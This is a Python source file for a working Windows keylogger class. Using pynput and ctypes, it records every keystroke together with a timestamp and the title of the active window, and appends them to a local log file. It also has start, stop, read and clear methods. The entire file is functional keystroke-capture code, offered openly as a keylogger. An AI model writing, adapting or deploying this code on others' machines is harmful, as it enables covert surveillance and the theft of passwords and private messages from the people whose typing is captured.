import os
import threading
import time
import json
import ctypes
from datetime import datetime
from ctypes import wintypes

from pynput import keyboard


class SimpleKeyLogger:
    """Simplified keylogger using only pynput and ctypes (no pywin32/pyHook dependency)"""
    
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.log_buffer = []
        self.is_running = False
        self.thread = None
        self.listener = None
        
        # Ensure log file exists
        if not os.path.exists(self.log_file):
            with open(self.log_file, 'w') as f:
                f.write("Keylogger started at {0}\n".format(datetime.now()))
                f.write("=" * 50 + "\n")
    
    def log_keystroke(self, key_data):
        """Log keystroke to buffer and file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        window_title = self.get_window_title()
        log_entry = "[{0}] [{1}] {2}\n".format(timestamp, window_title, key_data)
        
        # Add to buffer
        self.log_buffer.append(log_entry)
        
        # Write to file
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(log_entry)
                f.flush()
        except Exception as e:
            print("Error writing to log file: {0}".format(e))
    
    def get_window_title(self):
        """Get the title of the currently active window using ctypes"""
        try:
            # Get the foreground window handle
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            
            # Get the window title length
            length = user32.GetWindowTextLengthW(hwnd)
            if length == 0:
                return "Unknown Window"
            
            # Get the window title
            buffer = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buffer, length + 1)
            return buffer.value
        except Exception:
            return "Unknown Window"
    
    def on_key_press(self, key):
        """Handle key press events"""
        try:
            if hasattr(key, 'char') and key.char is not None:
                # Regular key
                self.log_keystroke("Key: '{0}'".format(key.char))
            else:
                # Special key
                key_name = str(key).replace('Key.', '')
                self.log_keystroke("Special: {0}".format(key_name))
        except Exception as e:
            self.log_keystroke("Error logging key: {0}".format(str(e)))
    
    def start(self):
        """Start the keylogger"""
        if self.is_running:
            return False
        
        try:
            self.is_running = True
            self.log_keystroke("=== KEYLOGGER STARTED ===")
            
            # Start pynput listener
            self.listener = keyboard.Listener(on_press=self.on_key_press)
            self.listener.start()
            
            return True
        except Exception as e:
            print("Error starting keylogger: {0}".format(e))
            self.is_running = False
            return False
    
    def stop(self):
        """Stop the keylogger"""
        if not self.is_running:
            return False
        
        try:
            self.is_running = False
            self.log_keystroke("=== KEYLOGGER STOPPED ===")
            
            if self.listener:
                self.listener.stop()
                self.listener = None
            
            return True
        except Exception as e:
            print("Error stopping keylogger: {0}".format(e))
            return False
    
    def get_logs(self):
        """Get logged keystrokes"""
        try:
            with open(self.log_file, 'r', encoding='utf-8') as f:
                return f.read()
        except Exception as e:
            return "Error reading logs: {0}".format(str(e))
    
    def clear_logs(self):
        """Clear the log file"""
        try:
            with open(self.log_file, 'w') as f:
                f.write("Keylogger cleared at {0}\n".format(datetime.now()))
                f.write("=" * 50 + "\n")
            self.log_buffer = []
            return True
        except Exception as e:
            print("Error clearing logs: {0}".format(e))
            return False


def create_keylogger(log_file="keylog.txt"):
    """Factory function to create a keylogger instance"""
    return SimpleKeyLogger(log_file)


# For backward compatibility
class KeyLogger(SimpleKeyLogger):
    """Backward compatibility alias"""
    pass
